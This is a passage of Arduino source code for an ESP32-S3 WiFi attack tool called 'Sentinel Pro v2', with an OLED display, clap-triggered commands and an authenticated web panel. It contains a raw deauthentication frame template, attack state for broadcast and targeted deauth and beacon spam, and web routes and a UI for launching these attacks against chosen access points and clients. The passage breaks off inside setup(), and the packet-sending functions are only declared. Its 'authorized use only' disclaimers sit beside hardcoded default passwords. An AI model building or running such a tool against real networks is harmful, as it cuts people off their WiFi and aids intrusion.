/*
 * Sentinel Pro v2 — ESP32-S3 Security Testing Tool
 * FOR EDUCATIONAL USE ONLY. Use only on networks you own or have permission to test.
 * 
 * Hardware:
 *   - ESP32-S3 DevKitC
 *   - SSD1306 OLED 128x64 (I2C: SDA=GPIO 8, SCL=GPIO 9)
 *   - INMP441 I2S Mic (WS=GPIO 15, SCK=GPIO 14, SD=GPIO 13)
 * 
 * Features:
 *   - WPA2 protected AP + HTTP Basic Auth
 *   - 0.96" OLED visual alerts (boot, idle, scanning, attack, threat)
 *   - INMP441 voice commands via clap pattern detection (Core 1)
 *     - 1 clap → Scan Networks
 *     - 2 claps → Stop All Attacks
 *     - 3 claps → Show Stats
 *   - XSS-safe SSID output, MAC validation, attack timeout
 */

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <Preferences.h>

// OLED Display
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

// I2S Microphone
#include <driver/i2s.h>

// ═══════════════════════════════════════════════════════════════════
//  PIN CONFIGURATION
// ═══════════════════════════════════════════════════════════════════

// OLED I2C Pins (ESP32-S3 defaults)
#define OLED_SDA      8
#define OLED_SCL      9
#define OLED_WIDTH    128
#define OLED_HEIGHT   64
#define OLED_ADDR     0x3C
#define OLED_RESET    -1    // No reset pin

// INMP441 I2S Pins
#define I2S_WS        15   // Word Select (LRCLK)
#define I2S_SCK       14   // Serial Clock (BCLK)
#define I2S_SD        13   // Serial Data (DOUT from mic)
#define I2S_PORT      I2S_NUM_0

// ═══════════════════════════════════════════════════════════════════
//  CONFIGURATION
// ═══════════════════════════════════════════════════════════════════

const char* AP_SSID = "SentinelPro";
const char* AP_PASS = "S3nt1n3l#Secure!";

// HTTP Basic Auth
const char* AUTH_USER = "admin";
const char* AUTH_PASS = "sentinel2024";

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);

// Safety limits
const unsigned long ATTACK_TIMEOUT_MS  = 300000;   // 5 min auto-stop
const unsigned long ATTACK_COOLDOWN_MS = 5000;      // 5s between requests

// Mic voice command config
const int32_t  CLAP_THRESHOLD   = 1500000;   // Amplitude threshold for clap detection
const uint32_t CLAP_DEBOUNCE_MS = 250;        // Min ms between claps
const uint32_t CLAP_WINDOW_MS   = 800;        // Max ms between claps in a pattern
const uint32_t CLAP_FINAL_MS    = 1000;       // Wait after last clap before executing

// OLED refresh rate
const unsigned long OLED_REFRESH_MS = 200;

// ═══════════════════════════════════════════════════════════════════
//  GLOBAL OBJECTS
// ═══════════════════════════════════════════════════════════════════

Adafruit_SSD1306 display(OLED_WIDTH, OLED_HEIGHT, &Wire, OLED_RESET);
WebServer server(80);
DNSServer dnsServer;
Preferences prefs;

// ═══════════════════════════════════════════════════════════════════
//  STATE VARIABLES
// ═══════════════════════════════════════════════════════════════════

// Attack state
bool attackRunning = false;
bool beaconSpam = false;
uint8_t apMac[6] = {0};
int apChannel = 1;
String apSSID = "";
uint8_t clientMac[6] = {0};
bool useBroadcast = true;
uint8_t broadcastMac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
unsigned long packetCount = 0;
unsigned long beaconCount = 0;
unsigned long attackStartTime = 0;
unsigned long lastAttackRequest = 0;
uint16_t sequenceNumber = 0;

// OLED state
enum DisplayScreen {
  SCREEN_BOOT,
  SCREEN_IDLE,
  SCREEN_SCANNING,
  SCREEN_ATTACK,
  SCREEN_ALERT,
  SCREEN_STATS,
  SCREEN_VOICE_CMD,
  SCREEN_VOICE_EXEC
};
volatile DisplayScreen currentScreen = SCREEN_BOOT;
unsigned long lastOledRefresh = 0;
unsigned long screenTimeout = 0;          // Auto-revert to IDLE
String oledAlertText = "";
String oledVoiceCmd = "";
bool oledFlashState = false;
unsigned long lastFlashToggle = 0;
int lastScanCount = 0;

// Microphone state (shared with Core 1 task)
volatile int clapCount = 0;
volatile unsigned long lastClapTime = 0;
volatile bool voiceCommandReady = false;
volatile int pendingVoiceCommand = 0;     // 0=none, 1=scan, 2=stop, 3=stats
bool micInitialized = false;

// ═══════════════════════════════════════════════════════════════════
//  PACKET TEMPLATES
// ═══════════════════════════════════════════════════════════════════

uint8_t deauthTemplate[26] = {
  0xC0, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x07, 0x00
};

uint8_t beaconTemplate[128] = {0};

// ═══════════════════════════════════════════════════════════════════
//  FUNCTION PROTOTYPES
// ═══════════════════════════════════════════════════════════════════

// Core functions
void scanNetworks();
void startAttack();
void stopAttack();
void sendDeauth();
void sendBeacon();
void fillBeaconTemplate();
String generateNetworkJSON();
bool parseMac(String macStr, uint8_t* mac);
void processSerialCommand(String cmd);
bool authenticateRequest();
String sanitizeForJSON(const String& input);

// OLED functions
void oledInit();
void oledUpdate();
void oledShowBoot();
void oledShowIdle();
void oledShowScanning();
void oledShowAttack();
void oledShowAlert(const String& text);
void oledShowStats();
void oledShowVoiceCmd(const String& cmd);
void oledShowVoiceExec(const String& cmd);
void oledDrawHeader(const char* title);
void oledDrawStatusBar();

// Mic functions
void micInit();
void micListenTask(void* parameter);
void processVoiceCommand(int cmd);

// ═══════════════════════════════════════════════════════════════════
//  OLED DISPLAY IMPLEMENTATION
// ═══════════════════════════════════════════════════════════════════

// 16x16 Sentinel shield icon bitmap
static const unsigned char PROGMEM shieldIcon[] = {
  0x03, 0xC0, 0x0F, 0xF0, 0x1F, 0xF8, 0x3F, 0xFC,
  0x7F, 0xFE, 0x7B, 0xDE, 0xF3, 0xCF, 0xF3, 0xCF,
  0xF3, 0xCF, 0xF3, 0xCF, 0x7B, 0xDE, 0x7F, 0xFE,
  0x3F, 0xFC, 0x1F, 0xF8, 0x0F, 0xF0, 0x03, 0xC0
};

void oledInit() {
  Wire.begin(OLED_SDA, OLED_SCL);

  if (!display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDR)) {
    Serial.println("[OLED] SSD1306 init FAILED! Check wiring.");
    return;
  }

  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  Serial.println("[OLED] SSD1306 128x64 initialized.");

  oledShowBoot();
}

void oledDrawHeader(const char* title) {
  // Top bar with icon + title
  display.drawBitmap(2, 0, shieldIcon, 16, 16, SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(22, 4);
  display.print(title);
  display.drawLine(0, 17, 127, 17, SSD1306_WHITE);
}

void oledDrawStatusBar() {
  // Bottom status bar
  display.drawLine(0, 54, 127, 54, SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(2, 56);

  if (attackRunning) {
    display.print("ATK:");
    display.print(packetCount);
    display.print(" CH:");
    display.print(apChannel);
  } else if (beaconSpam) {
    display.print("BCN:");
    display.print(beaconCount);
  } else {
    display.print("IDLE");
  }

  // Mic indicator on right
  display.setCursor(100, 56);
  if (micInitialized) {
    display.print("MIC");
    // Animated mic dot
    if ((millis() / 500) % 2) {
      display.fillCircle(122, 59, 2, SSD1306_WHITE);
    }
  } else {
    display.print("---");
  }
}

void oledShowBoot() {
  display.clearDisplay();

  // Centered shield icon (large)
  display.drawBitmap(56, 2, shieldIcon, 16, 16, SSD1306_WHITE);

  // Title
  display.setTextSize(2);
  display.setCursor(10, 22);
  display.print("SENTINEL");

  display.setTextSize(1);
  display.setCursor(35, 42);
  display.print("Pro v2.0");

  display.setCursor(18, 54);
  display.print("Initializing...");

  display.display();
}

void oledShowIdle() {
  display.clearDisplay();
  oledDrawHeader("SENTINEL PRO");

  display.setTextSize(1);
  display.setCursor(4, 22);
  display.print("Status: READY");

  display.setCursor(4, 34);
  display.print("AP: ");
  display.print(AP_SSID);

  display.setCursor(4, 44);
  display.print("IP: ");
  display.print(WiFi.softAPIP().toString());

  oledDrawStatusBar();
  display.display();
}

void oledShowScanning() {
  display.clearDisplay();
  oledDrawHeader("SCANNING...");

  // Animated radar sweep
  int frame = (millis() / 150) % 8;
  int cx = 64, cy = 38;
  display.drawCircle(cx, cy, 12, SSD1306_WHITE);
  display.drawCircle(cx, cy, 8, SSD1306_WHITE);
  display.drawCircle(cx, cy, 4, SSD1306_WHITE);
  display.fillCircle(cx, cy, 2, SSD1306_WHITE);

  // Sweep line
  float angle = frame * (3.14159 / 4.0);
  int ex = cx + (int)(14 * cos(angle));
  int ey = cy + (int)(14 * sin(angle));
  display.drawLine(cx, cy, ex, ey, SSD1306_WHITE);

  display.setTextSize(1);
  display.setCursor(4, 54);
  display.print("Discovering APs...");

  display.display();
}

void oledShowAttack() {
  display.clearDisplay();

  // Flash "!! ATTACK !!" alternating
  unsigned long now = millis();
  if (now - lastFlashToggle > 400) {
    oledFlashState = !oledFlashState;
    lastFlashToggle = now;
  }

  if (oledFlashState) {
    // Inverted flash
    display.fillRect(0, 0, 128, 18, SSD1306_WHITE);
    display.setTextColor(SSD1306_BLACK);
    display.setTextSize(2);
    display.setCursor(4, 1);
    display.print("!! ATTACK !!");
    display.setTextColor(SSD1306_WHITE);
  } else {
    display.setTextSize(2);
    display.setCursor(4, 1);
    display.print("!! ATTACK !!");
  }

  display.drawLine(0, 19, 127, 19, SSD1306_WHITE);

  display.setTextSize(1);
  display.setCursor(4, 23);
  display.print("SSID: ");
  // Truncate SSID to fit
  String truncSSID = apSSID.length() > 14 ? apSSID.substring(0, 14) + ".." : apSSID;
  display.print(truncSSID);

  display.setCursor(4, 33);
  display.print("MAC: ");
  char macBuf[18];
  snprintf(macBuf, sizeof(macBuf), "%02X:%02X:%02X:%02X:%02X:%02X",
           apMac[0], apMac[1], apMac[2], apMac[3], apMac[4], apMac[5]);
  display.print(macBuf);

  display.setCursor(4, 43);
  display.print("CH:");
  display.print(apChannel);
  display.print(" PKT:");
  display.print(packetCount);

  // Time remaining
  unsigned long elapsed = (millis() - attackStartTime) / 1000;
  unsigned long remaining = (ATTACK_TIMEOUT_MS / 1000) - elapsed;
  display.setCursor(82, 43);
  display.print(remaining);
  display.print("s");

  oledDrawStatusBar();
  display.display();
}

void oledShowAlert(const String& text) {
  display.clearDisplay();

  // Warning border
  display.drawRect(0, 0, 128, 64, SSD1306_WHITE);
  display.drawRect(1, 1, 126, 62, SSD1306_WHITE);

  // Exclamation triangle (crude)
  display.fillTriangle(54, 8, 74, 8, 64, 2, SSD1306_WHITE);
  display.setCursor(61, 4);
  display.setTextColor(SSD1306_BLACK);
  display.setTextSize(1);
  display.print("!");
  display.setTextColor(SSD1306_WHITE);

  display.setTextSize(1);
  display.setCursor(28, 18);
  display.print("!! ALERT !!");

  // Multi-line text
  display.setCursor(6, 32);
  display.print(text.substring(0, 21));
  if (text.length() > 21) {
    display.setCursor(6, 42);
    display.print(text.substring(21, 42));
  }

  display.display();
}

void oledShowStats() {
  display.clearDisplay();
  oledDrawHeader("STATISTICS");

  display.setTextSize(1);

  display.setCursor(4, 22);
  display.print("Deauth Pkts: ");
  display.print(packetCount);

  display.setCursor(4, 32);
  display.print("Beacons:     ");
  display.print(beaconCount);

  display.setCursor(4, 42);
  display.print("Networks:    ");
  display.print(lastScanCount);

  oledDrawStatusBar();
  display.display();
}

void oledShowVoiceCmd(const String& cmd) {
  display.clearDisplay();
  oledDrawHeader("VOICE CMD");

  display.setTextSize(1);
  display.setCursor(4, 24);
  display.print("Detected: ");
  display.print(clapCount);
  display.print(" clap(s)");

  display.setCursor(4, 38);
  display.print("> ");
  display.setTextSize(1);
  display.print(cmd);

  display.setCursor(4, 52);
  display.print("Executing...");

  display.display();
}

void oledShowVoiceExec(const String& cmd) {
  display.clearDisplay();

  // Success checkmark
  display.setTextSize(2);
  display.setCursor(52, 4);
  display.print("OK");

  display.drawLine(0, 22, 127, 22, SSD1306_WHITE);

  display.setTextSize(1);
  display.setCursor(4, 28);
  display.print("Voice Command:");

  display.setTextSize(1);
  display.setCursor(4, 42);
  display.print("> ");
  display.print(cmd);

  display.display();
}

// Master OLED update — called from loop()
void oledUpdate() {
  unsigned long now = millis();
  if (now - lastOledRefresh < OLED_REFRESH_MS) return;
  lastOledRefresh = now;

  // Auto-revert temporary screens after timeout
  if (screenTimeout > 0 && now > screenTimeout) {
    screenTimeout = 0;
    currentScreen = (attackRunning || beaconSpam) ? SCREEN_ATTACK : SCREEN_IDLE;
  }

  switch (currentScreen) {
    case SCREEN_BOOT:     break; // Only shown once during init
    case SCREEN_IDLE:     oledShowIdle(); break;
    case SCREEN_SCANNING: oledShowScanning(); break;
    case SCREEN_ATTACK:   oledShowAttack(); break;
    case SCREEN_ALERT:    oledShowAlert(oledAlertText); break;
    case SCREEN_STATS:    oledShowStats(); break;
    case SCREEN_VOICE_CMD:  oledShowVoiceCmd(oledVoiceCmd); break;
    case SCREEN_VOICE_EXEC: oledShowVoiceExec(oledVoiceCmd); break;
  }
}

// ═══════════════════════════════════════════════════════════════════
//  INMP441 MICROPHONE — I2S + CLAP DETECTION (RUNS ON CORE 1)
// ═══════════════════════════════════════════════════════════════════

void micInit() {
  i2s_config_t i2s_config = {
    .mode = (i2s_mode_t)(I2S_MODE_MASTER | I2S_MODE_RX),
    .sample_rate = 16000,
    .bits_per_sample = I2S_BITS_PER_SAMPLE_32BIT,
    .channel_format = I2S_CHANNEL_FMT_ONLY_LEFT,
    .communication_format = I2S_COMM_FORMAT_STAND_I2S,
    .intr_alloc_flags = ESP_INTR_FLAG_LEVEL1,
    .dma_buf_count = 4,
    .dma_buf_len = 64,
    .use_apll = false,
    .tx_desc_auto_clear = false,
    .fixed_mclk = 0
  };

  i2s_pin_config_t pin_config = {
    .bck_io_num   = I2S_SCK,
    .ws_io_num    = I2S_WS,
    .data_out_num = I2S_PIN_NO_CHANGE,
    .data_in_num  = I2S_SD
  };

  esp_err_t err = i2s_driver_install(I2S_PORT, &i2s_config, 0, NULL);
  if (err != ESP_OK) {
    Serial.printf("[MIC] I2S driver install failed: %d\n", err);
    micInitialized = false;
    return;
  }

  err = i2s_set_pin(I2S_PORT, &pin_config);
  if (err != ESP_OK) {
    Serial.printf("[MIC] I2S set pin failed: %d\n", err);
    i2s_driver_uninstall(I2S_PORT);
    micInitialized = false;
    return;
  }

  i2s_start(I2S_PORT);
  micInitialized = true;
  Serial.println("[MIC] INMP441 I2S initialized on Core 1.");

  // Launch listening task on Core 1 (WiFi sniffer stays on Core 0)
  xTaskCreatePinnedToCore(
    micListenTask,    // Task function
    "MicListener",    // Name
    4096,             // Stack size
    NULL,             // Parameters
    1,                // Priority (low, background)
    NULL,             // Task handle
    1                 // Core 1 (WiFi/deauth on Core 0)
  );

  Serial.println("[MIC] Clap detection task launched on Core 1.");
  Serial.println("[MIC] Commands: 1 clap=SCAN, 2 claps=STOP, 3 claps=STATS");
}

// ──────────────────────────────────────────────────────────────────
// Core 1 FreeRTOS Task: Continuous I2S audio sampling + clap detect
// This runs entirely on Core 1, never blocks WiFi on Core 0.
// ──────────────────────────────────────────────────────────────────
void micListenTask(void* parameter) {
  const int BUFFER_LEN = 64;
  int32_t buffer[BUFFER_LEN];
  size_t bytesRead = 0;

  int localClapCount = 0;
  unsigned long localLastClapTime = 0;
  bool inClap = false;                    // Debounce: currently inside a clap event
  unsigned long clapStartTime = 0;        // When the first clap of a pattern was detected

  while (true) {
    // Read I2S DMA buffer (blocks until data available — doesn't busy-wait)
    esp_err_t result = i2s_read(I2S_PORT, buffer, sizeof(buffer), &bytesRead, portMAX_DELAY);

    if (result != ESP_OK || bytesRead == 0) {
      vTaskDelay(1);
      continue;
    }

    int samplesRead = bytesRead / sizeof(int32_t);

    // Calculate peak amplitude in this buffer
    int32_t maxAmp = 0;
    for (int i = 0; i < samplesRead; i++) {
      int32_t sample = abs(buffer[i] >> 8);   // Shift to 24-bit range
      if (sample > maxAmp) maxAmp = sample;
    }

    unsigned long now = millis();

    // ── Clap Detection State Machine ──
    if (maxAmp > CLAP_THRESHOLD && !inClap) {
      // Debounce check
      if (now - localLastClapTime > CLAP_DEBOUNCE_MS) {
        localClapCount++;
        localLastClapTime = now;
        inClap = true;

        if (localClapCount == 1) {
          clapStartTime = now;
        }

        Serial.printf("[MIC] Clap #%d detected (amp: %ld)\n", localClapCount, (long)maxAmp);

        // Update shared state for OLED display
        clapCount = localClapCount;
        lastClapTime = now;
      }
    }

    // Release debounce when amplitude drops
    if (maxAmp < (CLAP_THRESHOLD / 3)) {
      inClap = false;
    }

    // Check if clap pattern is complete (waited long enough after last clap)
    if (localClapCount > 0 && (now - localLastClapTime > CLAP_FINAL_MS)) {
      // Only if total pattern time is reasonable (< 5 seconds)
      if (now - clapStartTime < 5000) {
        switch (localClapCount) {
          case 1:
            pendingVoiceCommand = 1;  // SCAN
            voiceCommandReady = true;
            Serial.println("[MIC] Voice Command: SCAN (1 clap)");
            break;
          case 2:
            pendingVoiceCommand = 2;  // STOP
            voiceCommandReady = true;
            Serial.println("[MIC] Voice Command: STOP (2 claps)");
            break;
          case 3:
            pendingVoiceCommand = 3;  // STATS
            voiceCommandReady = true;
            Serial.println("[MIC] Voice Command: STATS (3 claps)");
            break;
          default:
            Serial.printf("[MIC] Unknown pattern: %d claps (ignored)\n", localClapCount);
            break;
        }
      }

      // Reset for next pattern
      localClapCount = 0;
      clapCount = 0;
    }

    // Tiny yield to prevent watchdog trigger
    vTaskDelay(1);
  }
}

// Process voice commands on Core 0 (called from loop)
void processVoiceCommand(int cmd) {
  String cmdName;

  switch (cmd) {
    case 1:
      cmdName = "SCAN NETWORKS";
      oledVoiceCmd = cmdName;
      currentScreen = SCREEN_VOICE_CMD;
      screenTimeout = millis() + 2000;
      delay(500);  // Brief display
      currentScreen = SCREEN_SCANNING;
      scanNetworks();
      currentScreen = SCREEN_VOICE_EXEC;
      oledVoiceCmd = "SCAN COMPLETE";
      screenTimeout = millis() + 3000;
      break;

    case 2:
      cmdName = "STOP ALL";
      oledVoiceCmd = cmdName;
      currentScreen = SCREEN_VOICE_CMD;
      screenTimeout = millis() + 2000;
      delay(500);
      stopAttack();
      currentScreen = SCREEN_VOICE_EXEC;
      oledVoiceCmd = "ATTACKS STOPPED";
      screenTimeout = millis() + 3000;
      break;

    case 3:
      cmdName = "SHOW STATS";
      oledVoiceCmd = cmdName;
      currentScreen = SCREEN_VOICE_CMD;
      screenTimeout = millis() + 1500;
      delay(500);
      currentScreen = SCREEN_STATS;
      screenTimeout = millis() + 5000;
      break;

    default:
      break;
  }

  Serial.printf("[VOICE] Executed: %s\n", cmdName.c_str());
}

// ═══════════════════════════════════════════════════════════════════
//  AUTHENTICATION & SANITIZATION
// ═══════════════════════════════════════════════════════════════════

bool authenticateRequest() {
  if (!server.authenticate(AUTH_USER, AUTH_PASS)) {
    server.requestAuthentication();
    return false;
  }
  return true;
}

String sanitizeForJSON(const String& input) {
  String output = "";
  output.reserve(input.length() * 2);
  for (unsigned int i = 0; i < input.length(); i++) {
    char c = input.charAt(i);
    switch (c) {
      case '"':  output += "\\\""; break;
      case '\\': output += "\\\\"; break;
      case '<':  output += "\\u003c"; break;
      case '>':  output += "\\u003e"; break;
      case '&':  output += "\\u0026"; break;
      case '\'': output += "\\u0027"; break;
      case '/':  output += "\\/"; break;
      default:
        if (c >= 32 && c < 127) {
          output += c;
        } else {
          char hex[8];
          snprintf(hex, sizeof(hex), "\\u%04x", (unsigned char)c);
          output += hex;
        }
        break;
    }
  }
  return output;
}

// ═══════════════════════════════════════════════════════════════════
//  WEB PAGE HTML (PROGMEM)
// ═══════════════════════════════════════════════════════════════════

const char MAIN_PAGE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sentinel Pro - Security Tool</title>
<style>
  * { box-sizing: border-box; }
  body { font-family: 'Segoe UI', Arial, sans-serif; background: #0f0f14; color: #e0e0e0; margin: 0; padding: 20px; }
  h1 { color: #7b61ff; margin-bottom: 4px; }
  .subtitle { color: #666; font-size: 0.85em; margin-bottom: 20px; }
  button { background: linear-gradient(135deg, #7b61ff, #4cc9f0); color: white; border: none; padding: 10px 20px; margin: 5px; border-radius: 8px; cursor: pointer; font-weight: 600; transition: opacity 0.2s, transform 0.1s; }
  button:hover { opacity: 0.9; }
  button:active { transform: scale(0.97); }
  button.danger { background: linear-gradient(135deg, #ff4444, #ff6b6b); }
  select, input { padding: 10px; margin: 5px; border-radius: 8px; border: 1px solid #2a2a3a; background: #1a1a24; color: #e0e0e0; font-size: 14px; }
  select:focus, input:focus { border-color: #7b61ff; outline: none; }
  .section { margin: 20px 0; background: #1a1a24; border-radius: 12px; padding: 20px; border: 1px solid #2a2a3a; }
  .section h3 { margin-top: 0; color: #7b61ff; }
  .status { font-weight: bold; padding: 10px 16px; background: #1a1a24; border-radius: 8px; border: 1px solid #2a2a3a; margin-bottom: 15px; }
  .status.active { border-color: #ff4444; color: #ff4444; }
  .status.idle { border-color: #06d6a0; color: #06d6a0; }
  #networks { max-height: 300px; overflow-y: auto; }
  .network { padding: 10px; border-bottom: 1px solid #2a2a3a; cursor: pointer; border-radius: 6px; transition: background 0.2s; }
  .network:hover { background: #22222e; }
  .network:last-child { border-bottom: none; }
  .client { margin-left: 20px; font-size: 0.9em; color: #888; }
  .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
  .stat-box { background: #22222e; border-radius: 8px; padding: 12px; text-align: center; }
  .stat-box .value { font-size: 1.5em; font-weight: 700; color: #4cc9f0; }
  .stat-box .label { font-size: 0.8em; color: #666; margin-top: 4px; }
  .warning { background: rgba(255, 68, 68, 0.1); border: 1px solid rgba(255, 68, 68, 0.3); border-radius: 8px; padding: 12px; margin-bottom: 15px; color: #ff8888; font-size: 0.85em; }
  .hw-status { display: flex; gap: 16px; margin-top: 10px; }
  .hw-badge { padding: 4px 12px; border-radius: 12px; font-size: 0.75em; font-weight: 700; }
  .hw-badge.ok { background: rgba(6, 214, 160, 0.15); color: #06d6a0; border: 1px solid rgba(6, 214, 160, 0.3); }
  .hw-badge.err { background: rgba(255, 68, 68, 0.15); color: #ff6666; border: 1px solid rgba(255, 68, 68, 0.3); }
  .voice-info { background: rgba(123, 97, 255, 0.1); border: 1px solid rgba(123, 97, 255, 0.3); border-radius: 8px; padding: 12px; margin-top: 10px; color: #b8a0ff; font-size: 0.85em; }
</style>
</head>
<body>
<h1>🛡️ Sentinel Pro</h1>
<p class="subtitle">Security Testing Tool — Authorized Use Only</p>

<div class="warning">⚠️ This tool is for authorized security testing only. Unauthorized use is illegal.</div>

<div id="status" class="status idle">Status: Idle</div>

<div class="hw-status">
  <span class="hw-badge" id="oledBadge">OLED: --</span>
  <span class="hw-badge" id="micBadge">MIC: --</span>
</div>

<div class="voice-info">
  🎤 <strong>Voice Commands:</strong> 1 clap = Scan &bull; 2 claps = Stop &bull; 3 claps = Stats
</div>

<div class="section">
  <h3>Quick Actions</h3>
  <button onclick="scan()">📡 Scan Networks</button>
  <button onclick="location.reload()">🔄 Refresh</button>
  <button class="danger" onclick="stopAttack()">⛔ Stop All</button>
</div>

<div class="section">
  <h3>Discovered Networks</h3>
  <div id="networks">Click "Scan Networks" to discover APs and clients.</div>
</div>

<div class="section">
  <h3>Manual Attack</h3>
  <input type="text" id="targetMAC" placeholder="AP MAC (AA:BB:CC:DD:EE:FF)" pattern="^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$">
  <input type="number" id="targetCh" placeholder="Channel" min="1" max="13">
  <select id="attackMode">
    <option value="broadcast">Broadcast Deauth</option>
    <option value="targeted">Targeted Client</option>
    <option value="beacon">Beacon Spam</option>
  </select>
  <input type="text" id="clientMAC" placeholder="Client MAC (if targeted)" pattern="^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$">
  <button onclick="startAttack()">🚀 Start Attack</button>
</div>

<div class="section">
  <h3>Statistics</h3>
  <div class="stats-grid">
    <div class="stat-box"><div class="value" id="pktCount">0</div><div class="label">Deauth Packets</div></div>
    <div class="stat-box"><div class="value" id="beaconCount">0</div><div class="label">Beacon Frames</div></div>
  </div>
</div>

<script>
function scan() {
  document.getElementById('networks').textContent = 'Scanning...';
  fetch('/scan').then(r => r.json()).then(data => {
    const container = document.getElementById('networks');
    container.innerHTML = '';
    data.forEach(net => {
      const div = document.createElement('div');
      div.className = 'network';
      div.textContent = `${net.ssid} (${net.bssid}) Ch:${net.channel} RSSI:${net.rssi}`;
      div.onclick = function() { selectAP(net.bssid, net.channel, net.ssid); };
      if (net.clients && net.clients.length > 0) {
        const clientDiv = document.createElement('div');
        clientDiv.className = 'client';
        clientDiv.textContent = 'Clients: ' + net.clients.join(', ');
        div.appendChild(clientDiv);
      }
      container.appendChild(div);
    });
  }).catch(err => {
    document.getElementById('networks').textContent = 'Scan failed: ' + err.message;
  });
}
function selectAP(mac, ch, ssid) {
  document.getElementById('targetMAC').value = mac;
  document.getElementById('targetCh').value = ch;
}
function startAttack() {
  const mac = document.getElementById('targetMAC').value.trim();
  const ch = document.getElementById('targetCh').value;
  const mode = document.getElementById('attackMode').value;
  const client = document.getElementById('clientMAC').value.trim();
  const macRegex = /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/;
  if (!macRegex.test(mac)) { alert('Invalid AP MAC address format'); return; }
  if (mode === 'targeted' && client && !macRegex.test(client)) { alert('Invalid Client MAC'); return; }
  fetch(`/attack?mac=${encodeURIComponent(mac)}&ch=${encodeURIComponent(ch)}&mode=${encodeURIComponent(mode)}&client=${encodeURIComponent(client)}`)
    .then(r => r.text()).then(msg => {
      const s = document.getElementById('status');
      s.textContent = 'Status: ' + msg;
      s.className = 'status active';
      updateStats();
    });
}
function stopAttack() {
  fetch('/stop').then(r => r.text()).then(msg => {
    const s = document.getElementById('status');
    s.textContent = 'Status: ' + msg;
    s.className = 'status idle';
    updateStats();
  });
}
function updateStats() {
  fetch('/stats').then(r => r.json()).then(d => {
    document.getElementById('pktCount').textContent = d.packets;
    document.getElementById('beaconCount').textContent = d.beacons;
    const s = document.getElementById('status');
    s.className = d.attacking ? 'status active' : 'status idle';
    // Hardware badges
    const ob = document.getElementById('oledBadge');
    ob.textContent = 'OLED: ' + (d.oled ? 'OK' : 'N/A');
    ob.className = 'hw-badge ' + (d.oled ? 'ok' : 'err');
    const mb = document.getElementById('micBadge');
    mb.textContent = 'MIC: ' + (d.mic ? 'OK' : 'N/A');
    mb.className = 'hw-badge ' + (d.mic ? 'ok' : 'err');
  });
}
setInterval(updateStats, 2000);
</script>
</body>
</html>
)rawliteral";

// ═══════════════════════════════════════════════════════════════════
//  SETUP
// ═══════════════════════════════════════════════════════════════════

void setup() {
  Serial.begin(115200);
  delay(500);

  // 1. Initialize OLED first (shows boot screen)
  oledInit();
  delay(800);

  Serial.println("\n════════════════════════════════════════");
  Serial.println("  Sentinel Pro v2 — ESP32-S3");
  Serial.println("  OLED + INMP441 Voice Commands");
  Serial.println("  FOR AUTHORIZED USE ONLY");
  Serial.println("════════════════════════════════════════");

  // 2. Initialize preferences
  prefs.begin("sentinel");
  String savedPass = prefs.getString("ap_pass", AP_PASS);

  // 3. Start WiFi AP
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP(AP_SSID, savedPass.c_str());
  dnsServer.start(DNS_PORT, "*", apIP);

  Serial.printf("[WiFi] AP '%s' started. IP: %s\n", AP_SSID, WiFi.softAPIP().toString().c_str());

  // 4. Initialize INMP441 microphone on Core 1
  micInit();

  // 5. Setup web server routes
  server.on("/", HTTP_GET, []() {
    if (!authenticateRequest()) return;
    server.send_P(200, "text/html", MAIN_PAGE);
  });

  server.on("/scan", HTTP_GET, []() {
    if (!authenticateRequest()) return;
    currentScreen = SCREEN_SCANNING;
    oledUpdate();
    String json = generateNetworkJSON();
    currentScreen = SCREEN_IDLE;
    server.send(200, "application/json", json);
  });

  server.on("/attack", HTTP_GET, []() {
    if (!authenticateRequest()) return;
    unsigned long now = millis();
    if (now - lastAttackRequest < ATTACK_COOLDOWN_MS) {
      server.send(429, "text/plain", "Too many requests. Wait before starting another attack.");
      return;
    }
    lastAttackRequest = now;
    if (server.hasArg("mac") && server.hasArg("ch")) {
      String macStr = server.arg("mac");
      if (macStr.length() != 17) { server.send(400, "text/plain", "Invalid MAC format"); return; }
      if (!parseMac(macStr, apMac)) { server.send(400, "text/plain", "Invalid MAC address"); return; }
      int ch = server.arg("ch").toInt();
      if (ch < 1 || ch > 14) { server.send(400, "text/plain", "Invalid channel (1-14)"); return; }
      apChannel = ch;
      apSSID = "Manual";
      String mode = server.arg("mode");
      if (mode == "targeted" && server.hasArg("client")) {
        if (!parseMac(server.arg("client"), clientMac)) { server.send(400, "text/plain", "Invalid client MAC"); return; }
        useBroadcast = false;
      } else if (mode == "beacon") {
        beaconSpam = true;
        attackRunning = false;
        fillBeaconTemplate();
      } else {
        useBroadcast = true;
        beaconSpam = false;
      }
      startAttack();
      currentScreen = SCREEN_ATTACK;
      server.send(200, "text/plain", "Attack started (auto-stops in 5 min)");
    } else {
      server.send(400, "text/plain", "Missing parameters: mac and ch required");
    }
  });

  server.on("/stop", HTTP_GET, []() {
    if (!authenticateRequest()) return;
    stopAttack();
    currentScreen = SCREEN_IDLE;
    server.send(200, "text/plain", "All attacks stopped");
  });

  server.on("/stats", HTTP_GET, []() {
    if (!authenticateRequest()) return;
    String json = "{\"packets\":" + String(packetCount) +
                  ",\"beacons\":" + String(beaconCount) +
                  ",\"attacking\":" + String(attackRunning || beaconSpam ? "true" : "false") +
                  ",\"oled\":true" +
                  ",\"mic\":" + String(micInitialized ? "true" : "false") + "}";
